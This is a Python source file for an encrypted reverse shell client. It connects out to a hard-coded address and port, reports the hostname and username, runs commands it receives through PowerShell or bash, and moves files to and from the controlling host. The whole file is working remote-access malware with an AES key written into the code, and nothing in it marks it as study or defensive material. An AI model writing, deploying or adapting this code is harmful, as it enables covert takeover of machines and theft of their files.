import socket
import os
import subprocess
import getpass
import time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad,unpad
from Crypto.Random import get_random_bytes
HOST = "192.168.30.52"
PORT = 6565
aes_key = b'o\x802\x0ez\xe0\x8f\x8b\xc7>\xbf\x9fce\x85\xd3'


def encrypt_data(data):
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(aes_key, AES.MODE_CBC,iv)
    ciphertext = cipher.encrypt(pad(data, AES.block_size))
    return cipher.iv + ciphertext

def decrypt_data(encrypted_data):
    iv = encrypted_data[:AES.block_size]
    ciphertext = encrypted_data[AES.block_size:]
    cipher = AES.new(aes_key, AES.MODE_CBC, iv)
    decrypted_data = unpad(cipher.decrypt(ciphertext), AES.block_size)
    return decrypted_data

def info(f,client):
    ff = f"\033[32m{f}\033[0m\n"
    client.send(encrypt_data(ff.encode('utf-8')))



def first_connect(client):
    client.send(encrypt_data(socket.gethostname().encode('utf-8')))
    answer = decrypt_data(client.recv(1024)).decode("utf-8")
    if answer == "whoareyou":
        client.send(encrypt_data(getpass.getuser().encode("utf-8")))


def connect():
    os_name = os.name
    while 1:
        pwd = os.getcwd()
        client.send(encrypt_data(pwd.encode('utf-8')))
        response = decrypt_data(client.recv(40960))
        command = response.decode('utf-8')
        try:
            if command.split(" ")[0] == "cd":
                os.chdir(command.split(" ")[1])
            elif command == 'close':
                info("[*] Connection closed !!!",client)
                break
            elif command.split(" ")[0] == "ftp":
                stdout = ftp(command.split(" "),client)
                time.sleep(0.4)
                info(stdout,client)
                time.sleep(0.4)
                continue
            
            if os_name == "nt":
                stdout = subprocess.check_output(["powershell.exe", "-Command",command],shell=True)
            elif os_name == "posix":
                stdout = subprocess.check_output(["/bin/bash", "-c",command],shell=False)
                
        except :
            stdout = b"\033[32m[*] Command Not Found.\033[0m\n"
            
        if stdout:
            client.send(encrypt_data(stdout))
        else:
            client.send(encrypt_data(b"\n"))
        time.sleep(0.3)



def ftp(command,client):
    tip = command[1]
    file = command[2]

    

    def download(file,client):
        size = int(decrypt_data(client.recv(4128)).decode('utf-8'))
        if size == -1:
            return "[*] Not found !!!"
        client.send(b"Naber Aslan")
        while os.path.exists(file) : 
            file += '(new)'
        chunk = decrypt_data(client.recv(4128))
        with open(file,'ab') as f:
            while chunk != b"\n\r":
                f.write(chunk)
                chunk = decrypt_data(client.recv(4128))
        return "[*] Data uploaded successful."

    def upload(file,client):
        try:
            with open(f"./{file}",'rb') as f:
                client.send(encrypt_data(b'1'))
                client.recv(4096)
                chunk = f.read(4096)
                while chunk :
                    client.send(encrypt_data(chunk))
                    chunk = f.read(4096)
                time.sleep(0.3)
                client.send(encrypt_data(b"\n\r"))
            return "[*] Data downloaded successful."
        except:
            client.send(encrypt_data(b'-1'))
            return "[*] Not found !!!"
            
    if tip == "-u":
        return download(file,client)
    elif tip == "-d":
        return upload(file,client)
    else :
        return "[*] Wrong command !!!"  




client = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
client.connect((HOST,PORT))
first_connect(client)
while 1:
    command = decrypt_data(client.recv(40960)).decode("utf-8")
    match command:
            case "connect":
                connect()
            case "exit":
                client.close()
                break

